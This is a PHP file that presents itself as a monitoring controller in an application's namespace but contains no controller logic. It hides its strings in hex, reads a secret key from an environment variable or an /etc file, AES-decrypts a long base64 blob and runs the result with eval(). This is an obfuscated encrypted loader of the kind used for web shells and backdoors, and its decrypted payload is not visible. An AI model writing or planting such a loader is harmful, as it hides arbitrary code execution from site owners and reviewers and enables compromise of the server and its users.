<?php
namespace App\Http\Controllers\Monitoring;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('BR0Mdjr0x6YtJ0Je2yNYUA==');

$c=base64_decode(

'FBvps8Gdu4hkRALg11UO1S0YzLlhIKiP/G6Mc9+EOtTjKiW/EtHqRpqq9JrR3cAaICxhyrGmz3kF' .
'dAuyN9Q21jsh6BA4NKLAEvKa9r5NQXxmS+uvShnlRhTINXRhH46iCSuIpOkt0q+Okg0AWKdtJvxj' .
'p9+v2XZ4lZQEWXPgO8dLkKddKFKpNCnWX/V1TJ7TGtlhupUQXlgHCBc+umx0qCyWaX2CbM5fwmlJ' .
'JJ5cPZGj52AED1ZXVH70kRVIiD3nYURhtIpADHwQlJ+fhuqVTblvKGAt2//4n50m370vefWIgf/d' .
'XckLwjADpciNKYzKhmVd8BM44qKJCWUlhiyZhJmssLnMl7vkyOofcinEL8nh6mycOY+0HTCChpf9' .
'2VhC/N4Yq8B1Z0lUo8Mn3QLt5/1GbU1gliQJEYvSXs7hIlFLDhK6nsnKmPkEWDPv/XpQUGeIgO+K' .
'Zek044SG+lU5+DAYIfCTREKH1OW5Gcbgjt+MR8NbJgVD1ScQRXRGKOl7AFmgDhkN/FUQl7SPGtkW' .
'w9YmPRKr1hx288DMFBl4wdaTQlXW4XXvpm/CUAs6hInsLMkG0pfL0KwkPaA/DA0v7CYgmj8sMPYk' .
'Wdp8WkRrNjasTSaUDzF9o93LKKrKbEt5I4kw8nv9Fv4Gw/GkNDpIg1QYf0fjuWNa9syuwefEMWnE' .
'NthoBO/bPhR2GqVxZ37wWTQfA3ks9sjh13vr7oWOcIS6fcXIrznlale0LeNyrEKskHWFltycDiTx' .
'rOR/Ng67gKsXUv0T2L1FA1AVyRpPSpWHVLzwZY1UbLfY1BFvlPYAtJdzTQje9pGdahv2EyPNfvma' .
'1ko1PECwNABbOtyLCfQcrmlOp8rvfcHeD0nO38d126Hd/Ngqu2lImIGYGPYTuP1u4+fQR+QlxNrV' .
'GnpfphhZV2mbBgNyIaKPEh9sSgv/DodZc6bDZbwS40jK5Zp9emzVlZKvypT9N+QFiQVnMMi1mlkX' .
'L8+mR4WhLR54wTHblyiWkyZRgTGbduHeDt4FCZRwcdVXySs6ZBAmIW+Li1nXP4xjQRwXJJyw/PWg' .
'Q8jEOSNCHUur3jKeS8LmWe1YvaOQ9uqOCEkJJ1DtpU6rWzF8rrmrZJMbg3HpedLVNpjauRMtucV+' .
'NWrYfy832M6jP4KPKVoipCJ//BLIhaY42UN61c9TlZBNk08Oeiw6Tm5vcQNEZrtkl62BJjK1sS2l' .
'LZLkkQfYhO60cw/PDelFGZYg/zj0XqRmbWnau/Pz5T4fWfgvcrzUW0uafCf379uaBgVu2aS0F1qS' .
'9U6wJ/6mAbvX7BDlSc2PXIoddAVD6qAYcngX2VypCVfrDFqXneJw7AhjP7bh0O5EO1D9TRpYkNdT' .
'U77QRdCjphTRS5nogNWWB2DL2IAV3w5RVGDKpf+8EcE94ulFyOqY42SBXdB1sVMVTcKKNB1a1fdU' .
'tJAiDRl8VzOsvFgbKlyjDeJ6ReGTUTCpIbSY20ezEYHvOlNX5j9kkFXtyVy7zaGow84D32gXNr9n' .
'fvzshDyHztIYQpOkHxMTaZPxeBQS0Mcv6xOB6X2JiCqxn1X8XTarJyswF6locSCg/R56uGUAOXOi' .
'jd0PuIcFpF3JHhELmK5hL8lTxk4qVsH+M83vgVvvj62F45Sr0DXHwjqPCyWlX8vz68NuiZV9h1zT' .
'mLs9Iw4qCKnLLfe2iiH2m2lkQu7hNdi2ROB2FKAHuL1rvsU0DHkLPad7'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

